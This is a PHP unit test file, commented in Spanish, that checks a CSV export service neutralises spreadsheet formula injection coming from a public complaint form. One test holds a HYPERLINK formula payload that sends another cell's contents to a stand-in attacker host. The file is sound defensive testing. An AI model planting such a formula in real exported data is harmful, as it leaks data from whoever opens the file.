<?php

require_once dirname(__DIR__, 2) . '/app/servicios/servicio_exportacion.php';

/**
 * Cubre la exportación a CSV.
 *
 * El caso que justifica estas pruebas: descripcion_problema lo escribe un
 * ciudadano anónimo desde el formulario público, y acaba en un archivo que
 * abre el rector en Excel. Si ese texto puede convertirse en fórmula, el
 * formulario público es un vector de ataque contra quien exporta.
 */
final class ExportacionCsvTest extends BaseDbTestCase
{
    private ServicioExportacion $servicio;

    protected function setUp(): void
    {
        parent::setUp();
        $this->servicio = new ServicioExportacion(self::ID_INSTITUCION);
    }

    /** generar_csv y escapar_csv son privados; se prueban por su efecto real. */
    private function csvDe(string $descripcion): string
    {
        $this->bd->ejecutar(
            'UPDATE reporte SET descripcion_problema = ? WHERE id_reporte = ?',
            [$descripcion, $this->reporteDePrueba()]
        );

        return $this->servicio->exportar_reportes_csv();
    }

    private function reporteDePrueba(): int
    {
        require_once dirname(__DIR__, 2) . '/app/modelos/modelo_reporte.php';
        $modelo = new ModeloReporte();
        return (int) $modelo->crear($this->datosReporteValido());
    }

    public function testUnaFormulaEscritaPorUnCiudadanoNoLlegaComoFormula(): void
    {
        $csv = $this->csvDe('=1+1');

        $this->assertStringContainsString("\"'=1+1\"", $csv);
        $this->assertStringNotContainsString('"=1+1"', $csv);
    }

    public function testElAtaqueDeHyperlinkQuedaNeutralizado(): void
    {
        // Este es el caso realista: quien abre el archivo ve un enlace con
        // aspecto legítimo que filtra el contenido de otra celda.
        $csv = $this->csvDe('=HYPERLINK("http://atacante.example/?f="&A1,"Ver la foto")');

        $this->assertStringContainsString("'=HYPERLINK", $csv);
    }

    public function testTambienSeNeutralizanLosOtrosTresPrefijos(): void
    {
        foreach (['+SUM(A1)', '@SUM(A1)', '-3+2*A1'] as $ataque) {
            $csv = $this->csvDe($ataque);
            $this->assertStringContainsString("'" . $ataque, $csv,
                "No se neutralizó: {$ataque}");
        }
    }

    public function testUnNumeroNegativoSigueSiendoUnNumero(): void
    {
        // -2 empieza por "-" pero es un número. Convertirlo en texto rompería
        // cualquier suma de la hoja de cálculo, así que se deja tal cual.
        $csv = $this->csvDe('-2');

        $this->assertStringContainsString('"-2"', $csv);
        $this->assertStringNotContainsString("\"'-2\"", $csv);
    }

    public function testElTextoNormalNoSeToca(): void
    {
        $csv = $this->csvDe('La ventana del aula 203 está rota.');

        $this->assertStringContainsString('La ventana del aula 203 está rota.', $csv);
        $this->assertStringNotContainsString("'La ventana", $csv);
    }

    public function testLasComillasSeSiguenEscapando(): void
    {
        $csv = $this->csvDe('El tablero dice "peligro" y nadie lo revisa');

        $this->assertStringContainsString('""peligro""', $csv);
    }
}
